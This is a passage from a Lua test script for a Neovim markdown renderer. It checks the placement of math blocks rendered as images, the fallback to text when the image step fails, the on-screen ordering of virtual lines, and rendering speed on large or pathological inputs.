  k = placed({ "$$", "x", "$$" }, 1, { overlay = true })
  assert(#k.overlay == 1 and #k.above == 0, "6d. overlay = true: " .. vim.inspect(k))
end
print("6d. placement: S3 R1, S3 R3, S1 R3, S5 R2, wide line, indent, center, overlay = false ok")

-- 6e. an image path that fails leaves the text rendering
do
  local ls = { "$$", "x", "$$", "$$y$$" }
  for what, answer in pairs({
    error = function() error("boom") end,
    ["no rows"] = function() return { cols = 3, hl = "TestPH", text = { "r1" } } end,
    ["rows 0"] = function() return { rows = 0, cols = 3, hl = "TestPH", text = {} } end,
    ["a row missing"] = function() return { rows = 2, cols = 3, hl = "TestPH", text = { "r1" } } end,
    ["no hl"] = function() return { rows = 1, cols = 3, text = { "r1" } } end,
    ["not a table"] = function() return "image" end,
    ["fractional rows"] = function() return { rows = 1.5, cols = 3, hl = "TestPH", text = { "r1", "r2" } } end,
  }) do
    local ctx, calls = fake_ctx(answer)
    local b, ms = render_ctx(ls, ctx)
    assert(#calls == 2, "6e. " .. what .. ": asked " .. #calls .. " times")
    assert(same_marks(mark_list(ms), text_marks(ls)), "6e. " .. what .. ": not the text rendering")
    vim.api.nvim_buf_delete(b, { force = true })
  end
  -- one block an image, the next text: each block on its own
  local ctx = fake_ctx(function(tex) return tex == "x" and image(1) or nil end)
  local b, ms = render_ctx(ls, ctx)
  local overlay3, inline3 = false, false
  for _, m in ipairs(ms) do
    if m[2] == 1 and m[4].virt_text_pos == "overlay" then overlay3 = true end
    if m[2] == 3 and m[4].virt_text_pos == "inline" and m[4].virt_text[1][1] == "y" then inline3 = true end
  end
  assert(overlay3 and inline3, "6e. an image block and a text block side by side wrong")
  vim.api.nvim_buf_delete(b, { force = true })
end
print("6e. a failing or malformed answer keeps the text rendering ok")

-- 6f. on screen: the image rows, then the cell's own rows. The cell's
-- spacer is a leftcol virtual line at the END of its last line (as
-- render.lua anchors it), so the rows hung at column 0 of that line by the
-- markdown renderer (a formula's extra rows, a table's bottom border) show
-- before it.
do
  -- the cell's lines between a line "before" (virtual lines above the
  -- buffer's first line only show once scrolled to) and a line "after"
  local function screen(ls, ctx, rows)
    local b = vim.api.nvim_create_buf(true, false)
    vim.api.nvim_buf_set_lines(b, 0, -1, false, { "before" })
    vim.api.nvim_buf_set_lines(b, -1, -1, false, ls)
    local last = #ls
    vim.api.nvim_buf_set_extmark(b, ns, last, #ls[#ls], {
      virt_lines = { { { "SPACER", "Normal" } } }, virt_lines_leftcol = true,
    })
    MD.render(b, ns, 1, last, 60, ctx)
    vim.api.nvim_buf_set_lines(b, -1, -1, false, { "after" })
    local win = vim.api.nvim_open_win(b, true, { relative = "editor", row = 0, col = 0, width = 60, height = 12 })
    vim.wo[win].conceallevel = 2
    vim.wo[win].concealcursor = "nc"
    vim.wo[win].wrap = true
    vim.api.nvim_win_set_cursor(win, { last + 2, 0 })
    vim.cmd("redraw")
    local pos = vim.fn.win_screenpos(win)
    local out = {}
    for r = 0, rows - 1 do
      local cells = {}
      for c = 1, 20 do cells[#cells + 1] = vim.fn.screenstring(pos[1] + r, pos[2] + c - 1) end
      out[#out + 1] = vim.trim(table.concat(cells))
    end
    vim.api.nvim_win_close(win, true)
    vim.api.nvim_buf_delete(b, { force = true })
    return out
  end
  local s = screen({ "$$\\frac{a}{b}$$" }, fake_ctx(function() return image(3) end), 6)
  assert(table.concat(s, "|") == "before|r1|r2|r3|SPACER|after", "6f. S1 R3 on screen: " .. table.concat(s, "|"))
  s = screen({ "$$", "x", "$$" }, fake_ctx(function() return image(1) end), 6)
  assert(table.concat(s, "|") == "before||r1||SPACER|after", "6f. S3 R1 on screen: " .. table.concat(s, "|"))
  s = screen({ "$$\\frac{a}{b}$$" }, fake_ctx(function() return image(3) end, { overlay = false }), 7)
  assert(table.concat(s, "|") == "before|r1|r2|r3||SPACER|after",
    "6f. no overlay S1 R3 on screen: " .. table.concat(s, "|"))
  s = screen({ "| a | b |", "|---|---|", "| 1 | 2 |" }, nil, 8)
  assert(s[6]:find("└", 1, true) and s[7] == "SPACER" and s[8] == "after",
    "6f. a table's bottom border must come before the cell's spacer: " .. table.concat(s, "|"))
end
print("6f. on screen: image rows and a table's border before the cell's spacer ok")

-- 6g. find_math_spans still runs once per line with a ctx
do
  local real = MD.find_math_spans
  local n = 0
  MD.find_math_spans = function(l) n = n + 1; return real(l) end
  local ls = { "$$x$$", "\\[y\\]", "plain $z$ text", "\\begin{equation}w\\end{equation}" }
  for _, answer in ipairs({ never, function() return image(1) end }) do
    n = 0
    local b = render_ctx(ls, (fake_ctx(answer)))
    vim.api.nvim_buf_delete(b, { force = true })
    assert(n == #ls, "6g. find_math_spans ran " .. n .. " times for " .. #ls .. " lines")
  end
  MD.find_math_spans = real
end
print("6g. find_math_spans once per line ok")

-- 6h. speed: the section-5 inputs, and long blocks, with a ctx
do
  local inputs = {
    string.rep("$a$*b*", 20000),
    string.rep("[a](b)$c$", 20000),
    string.rep("\\(", 20000),
    string.rep("\\\\(", 20000),
    string.rep("$$a", 20000),
  }
  local block = { "$$" }
  for i = 2, 5001 do block[i] = "x_" .. i end
  block[#block + 1] = "$$"
  local singles = {}
  for i = 1, 5000 do singles[i] = "$$x_" .. i .. "$$" end
  for _, answer in ipairs({ never, function() return image(2) end }) do
    for _, ln in ipairs(inputs) do
      local b = vim.api.nvim_create_buf(true, false)
      vim.api.nvim_buf_set_lines(b, 0, -1, false, { ln })
      local t0 = vim.uv.hrtime()
      MD.render(b, ns, 0, 0, 80, fake_ctx(answer))
      local dt = (vim.uv.hrtime() - t0) / 1e6
      assert(dt < 1000, ("6h. %s... took %.0f ms with a ctx"):format(ln:sub(1, 12), dt))
      vim.api.nvim_buf_delete(b, { force = true })
    end
    for what, ls in pairs({ ["a 5002-line block"] = block, ["5000 one-line blocks"] = singles }) do
      local b = vim.api.nvim_create_buf(true, false)
      vim.api.nvim_buf_set_lines(b, 0, -1, false, ls)
      local t0 = vim.uv.hrtime()
      MD.render(b, ns, 0, #ls - 1, 80, fake_ctx(answer))
      local dt = (vim.uv.hrtime() - t0) / 1e6
      assert(dt < 1000, ("6h. %s took %.0f ms with a ctx"):format(what, dt))
      vim.api.nvim_buf_delete(b, { force = true })
    end
  end
end
print("6h. speed with a ctx ok")

print("ALL MARKDOWN CHECKS PASSED")
vim.cmd("qa!")
